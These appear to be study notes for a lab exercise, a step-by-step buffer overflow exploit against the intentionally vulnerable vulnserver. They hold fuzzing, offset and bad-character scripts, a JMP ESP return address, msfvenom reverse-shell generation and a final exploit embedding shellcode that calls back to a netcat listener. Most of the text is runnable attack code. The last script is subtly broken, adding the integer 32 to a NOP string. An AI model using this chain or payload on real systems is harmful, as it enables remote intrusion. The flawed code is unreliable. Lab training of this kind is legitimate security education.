1. Spiking
2. Fuzzing
3. Finding the Offset
4. Overwriting the EIP
5. Finding Bad Characters
6. Finding the Right Module
7. Generating Shellcode
# stack 
Anatomy of Memory  

STACK
ESP 
Buffer Space  
EBP
EIP/Return Address}  
HEAP  
DATA  

![](assets/Pasted%20image%2020240211195902.png)
## Spiking

- Using Immunity Debugger
- Employing vulnserver
	- Running both with administrative privileges

* Establish connection with vulnserver via nc

```bash
nc -nv 192.168.57.12 9999
```

* Inject random characters utilizing generic_send_tcp

```bash
# Example: spiking with stats.spk
s_readline();
s_string("STATS ");
s_string_variable("0");
```

```bash
generic_send_tcp 192.168.57.12 9999 stats.spk 0 0
```

```bash
# Demonstration: trun.spk
s_readline();
s_string("TRUN ");
s_string_variable("0");
```

```bash
generic_send_tcp 192.168.57.12 9999 trun.spk 0 0
# This action causes vulnserver to crash due to buffer overflow
```

## Fuzzing

* Similar to spiking, apply a barrage of characters at a specific command to identify vulnerabilities. 

```python
#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
        try:
                payload = "TRUN /.:/" + buffer
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('192.168.57.12',9999))
                print("[+] Sending the payload\n" + str(len(buffer)))
                s.send((payload.encode()))
                s.close()
                sleep(1)
                buffer = buffer + "A"*100

        except:
                print("Fuzzing crashed at %s bytes" % (str(len(buffer))))
                sys.exit()
```

```bash
chmod +x fuzzingscript.py

./fuzzingscript.py
# vulnserver crashes at 2000-3000 bytes
```

## Offset Detection

```python
#!/usr/bin/python
import sys, socket

offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9

```python
#!/usr/bin/python
import sys, socket

offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9"

try:
    payload = 'TRUN /.:/' + offset
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.57.12',9999))
    s.send((payload.encode()))
    s.close()

except:
    print("Error connecting to server")
    sys.exit()

```

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
# generates the code
# -l 3000 for 3000 bytes crash

chmod +x finding_offset_script.py
./finding_offset_script.py
# gives EIP 386F4337

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
# pattern match at offset 2003
```

## Overwriting the EIP

* edit the script from before
```python
#!/usr/bin/python
import sys, socket

shellcode = "A" * 2003 + "B" * 4
# EIP @ 2003
# * 4 bytes for EIP

try:
    payload = 'TRUN /.:/' + shellcode
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.57.12',9999))
    s.send((payload.encode()))
    s.close()

except:
    print("Error connecting to server")
    sys.exit()

```

```bash
./finding_offset_script.py
```
* EIP is overwritten

## Finding Bad Characters

```python
#!/usr/bin/python
import sys, socket

badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)


shellcode = "A" * 2003 + "B" * 4 + badchars

try:
    payload = 'TRUN /.:/' + shellcode
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.57.12',9999))
    s.send((payload.encode()))
    s.close()

except:
    print("Error connecting to server")
    sys.exit()

```

```bash
sudo pip install badchars
badchars -f python

chmod +x badchars.py

./badchars.py
```

* see  hexdump in Immunity Debugger
	* ESP - Right-Click - Follow in Dump.

* a character out of order from 01 to FF is a bad char
	* get all bad chars in hexdump for shellcode
	* if there are multiple consecutive bad characters, only the first counts

## Finding the Right Module

* use mona modules tool in Immunity Debugger

* !mona modules in the command bar in Immunity Debugger; 
* we have ```essfunc.dll``` module.
- find opcode for JMP ESP
```bash
#assembly to hex
locate nasm shell
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

JMP ESP
# hex equivalent FFE4
# command for ID
```

```
!mona find -s "\xff\xe4" -m essfunc.dll
```
- FFE4 is the needed opcode for command bar
- FFE4 pointers as result set to false

```python
#!/usr/bin/python
import sys, socket

# return address 0x625011af
# litte endian binary is 32-bit x86 => reverse order
shellcode = "A" * 2003 + "\xaf\x11\x50\x62"

try:
    payload = 'TRUN /.:/' + shellcode
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.57.12',9999))
    s.send((payload.encode()))
    s.close()

except:
    print("Error connecting to server")
    sys.exit()

```

```bash
./badchars.py
```

* set a breakpoint at (625011af).
* point this EIP to shellcode

## Generating Shellcode

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.153 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
# -p reverse tcp payload
# exitfunc=thread stable shell
# -f C code
# -a x86 
# -b badcharse
```

```python
#!/usr/bin/python
import sys, socket

overflow = (
"\xda\xd1\xb8\x12\xb4\xad\xf1\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x31\x43\x17\x03\x43\x17\x83\xd1\xb0\x4f\x04\x29\x50\x0d"
"\xe7\xd1\xa1\x72\x61\x34\x90\xb2\x15\x3d\x83\x02\x5d\x13\x28"
"\xe8\x33\x87\xbb\x9c\x9b\xa8\x0c\x2a\xfa\x87\x8d\x07\x3e\x86"
"\x0d\x5a\x13\x68\x2f\x95\x66\x69\x68\xc8\x8b\x3b\x21\x86\x3e"
"\xab\x46\xd2\x82\x40\x14\xf2\x82\xb5\xed\xf5\xa3\x68\x65\xac"
"\x63\x8b\xaa\xc4\x2d\x93\xaf\xe1\xe4\x28\x1b\x9d\xf6\xf8\x55"
"\x5e\x54\xc5\x59\xad\xa4\x02\x5d\x4e\xd3\x7a\x9d\xf3\xe4\xb9"
"\xdf\x2f\x60\x59\x47\xbb\xd2\x85\x79\x68\x84\x4e\x75\xc5\xc2"
"\x08\x9a\xd8\x07\x23\xa6\x51\xa6\xe3\x2e\x21\x8d\x27\x6a\xf1"
"\xac\x7e\xd6\x54\xd0\x60\xb9\x09\x74\xeb\x54\x5d\x05\xb6\x30"
"\x92\x24\x48\xc1\xbc\x3f\x3b\xf3\x63\x94\xd3\xbf\xec\x32\x24"
"\xbf\xc6\x83\xba\x3e\xe9\xf3\x93\x84\xbd\xa3\x8b\x2d\xbe\x2f"
"\x4b\xd1\x6b\xff\x1b\x7d\xc4\x40\xcb\x3d\xb4\x28\x01\xb2\xeb"
"\x49\x2a\x18\x84\xe0\xd1\xcb\x6b\x5c\xc7\x92\x04\x9f\xf7\xb5"
"\x88\x16\x11\xdf\x20\x7f\x8a\x48\xd8\xda\x40\xe8\x25\xf1\x2d"
"\x2a\xad\xf6\xd2\xe5\x46\x72\xc0\x92\xa6\xc9\xba\x35\xb8\xe7"
"\xd2\xda\x2b\x6c\x22\x94\x57\x3b\x75\xf1\xa6\x32\x13\xef\x91"
"\xec\x01\xf2\x44\xd6\x81\x29\xb5\xd9\x08\xbf\x81\xfd\x1a\x79"
"\x09\xba\x4e\xd5\x5c\x14\x38\x93\x36\xd6\x92\x4d\xe4\xb0\x72"
"\x0b\xc6\x02\x04\x14\x03\xf5\xe8\xa5\xfa\x40\x17\x09\x6b\x45"
"\x60\x77\x0b\xaa\xbb\x33\x2b\x49\x69\x4e\xc4\xd4\xf8\xf3\x89"
"\xe6\xd7\x30\xb4\x64\xdd\xc8\x43\x74\x94\xcd\x08\x32\x45\xbc"
"\x01\xd7\x69\x13\x21\xf2")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" + 32 + overflow
# x90 + 32 NOPslide for padding

try:
    payload = 'TRUN /.:/' + shellcode
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.57.12',9999))
    s.send((payload.encode()))
    s.close()

except:
    print("Error connecting to server")
    sys.exit()

```

```bash
chmod +x access.py
nc -nvlp 4444

./access.py
```

- root access